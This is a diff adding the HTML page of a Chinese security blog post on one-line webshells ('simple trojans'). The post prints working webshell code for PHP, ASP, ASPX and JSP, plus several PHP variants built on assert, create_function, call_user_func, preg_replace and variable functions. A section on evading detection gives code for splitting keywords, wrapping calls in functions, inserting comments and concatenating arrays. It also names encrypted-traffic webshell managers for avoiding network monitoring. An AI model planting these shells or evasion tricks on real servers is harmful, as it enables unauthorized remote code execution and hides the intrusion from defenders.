@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>简单木马 | z0ekball</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1649935555331">
+<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="一句话木马
+原理
+ &lt;?php @eval($_POST['pass']); ?&gt;
+
+&lt;?php ?&gt;：解析成php代码
+@：不报错
+$_POST['pass']：php里面几个超全局变量，$_GET、$_POST就..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://z0ekball.github.io">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1649935555331" class="site-logo">
+        <h1 class="site-title">z0ekball</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">简单木马</h2>
+            <div class="post-date">2021-08-10</div>
+            
+              <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/jian-dan-mu-ma.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="一句话木马">一句话木马</h2>
+<h3 id="原理">原理</h3>
+<pre><code class="language-php"> &lt;?php @eval($_POST['pass']); ?&gt;
+</code></pre>
+<p><code>&lt;?php ?&gt;</code>：解析成php代码</p>
+<p><code>@</code>：不报错</p>
+<p><code>$_POST['pass']</code>：php里面几个超全局变量，<code>$_GET</code>、<code>$_POST</code>就是其中之一，意思为用post方法接收pass这个变量</p>
+<p><code>eval()</code>：eval()把字符串作为PHP代码执行</p>
+<p><code>整句意思</code>：post方式接收变量pass，若pass=echo 'a'，则代码就成了<code>&lt;?php eval(&quot;echo 'a';&quot;); ?&gt;</code>，也就是通过pass这个变量传入php代码为所欲为。</p>
+<p>通过一句话木马，使用菜刀、蚁剑、冰蝎等强悍的工具，可以攻陷整个网站主机。</p>
+<h3 id="常见一句话木马">常见一句话木马</h3>
+<h4 id="基础款">基础款</h4>
+<pre><code class="language-php">php的一句话木马：&lt;?php @eval($_POST['pass']);?&gt;
+asp的一句话木马：&lt;%eval request (&quot;pass&quot;)%&gt;
+aspx的一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
+jsp的一句话木马：
+&lt;%
+if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());
+%&gt;
+</code></pre>
+<h4 id="简单变型">简单变型</h4>
+<p>php:</p>
+<pre><code class="language-php">//绕过&lt;?
+&lt;script language=&quot;php&quot;&gt;@eval($_POST[pass])&lt;/script&gt;
+    
+//assert函数
+&lt;?php assert(@$_POST[pass]);?&gt;
+    
+//creat_function函数，传参到fun()并执行
+&lt;?php
+$fun = create_function('',$_POST['pass']);
+$fun();
+?&gt;
+    
+//call_user_func回调函数，绕过waf
+&lt;?php
+@call_user_func(assert,$_POST['pass']);
+?&gt;
+
+//preg_replace函数
+&lt;?php
+@preg_replace(&quot;/abcde/e&quot;, $_POST['pass'], &quot;abcdefg&quot;);
+?&gt;
+
+// file_put_contents函数,生成木马文件
+&lt;?php
+$test='&lt;?php $a=$_POST[&quot;pass&quot;];assert($a); ?&gt;';
+file_put_contents(&quot;Trojan.php&quot;, $test);
+?&gt;
+
+//array数组
+&lt;?php
+$a='assert';
+array_map(&quot;$a&quot;,$_REQUEST);
+?&gt;
+&lt;?php
+$item['JON']='assert';
+$array[]=$item;
+$array[0]['JON']($_POST[&quot;pass&quot;]);
+?&gt;
+
+//php变量函数
+&lt;?php
+$a = &quot;eval&quot;;
+$a(@$_POST['pass']);
+?&gt;
+
+</code></pre>
+<h3 id="木马免杀">木马免杀</h3>
+<h4 id="木马查杀">木马查杀</h4>
+<p><code>文件内容查杀</code>：对脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其它文件的关联性等多个维度的特征进行检测,即先建立一个恶意字符串特征库，同时对WEB文件修改时间，文件权限以及文件所有者等进行确认。容易误报，无法对加密或者经过特殊处理的Webshell文件进行检测。</p>
+<p><code>网络请求查杀</code>：当木马被执行时，如果请求参数的值中存在某些危险函数、或者关键字，那么会被防护产品拦截，通过Webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度。</p>
+<p><code>日志分析查杀</code>：使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测 技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
+<h4 id="木马免杀-2">木马免杀</h4>
+<p><code>关键字绕过</code>：拆分关键字</p>
+<p><code>构造函数</code>：构造一个函数，拼接成一句话木马</p>
+<pre><code class="language-php">&lt;?php
+function x()
+{
+    return $_POST['pass'];
+}
+eval(x());
+?&gt;
+</code></pre>
+<p><code>注释隔断</code>：一般查杀会对高危函数的前后语句进行拼接并检测，注释符可以隔断这种拼接从而绕过检查</p>
+<pre><code class="language-php">&lt;?php
+function x()
+{
+    return &quot;/*sasas23123*/&quot;.$_POST['pass'].&quot;/*sdfw3123*/&quot;;
+}
+eval(x());
+?&gt;
+</code></pre>
+<p><code>转码绕过</code>：转码特征值，再通过解码来执行相关语句</p>
+<p><code>数组拼接</code>：利用数组拼接木马语句</p>
+<pre><code class="language-php">&lt;?php
+$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
+$a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pass'])))));
+?&gt;
+</code></pre>
+<p><code>工具利用</code>：传统方法利用菜刀管理webshell 的流量特征很明显，很容易被检测到，可使用流量加密的webshell工具，如冰蝎，来躲避流量监测。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://z0ekball.github.io/post/wen-jian-bao-han/">
+                  <h3 class="post-title">
+                    文件包含
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
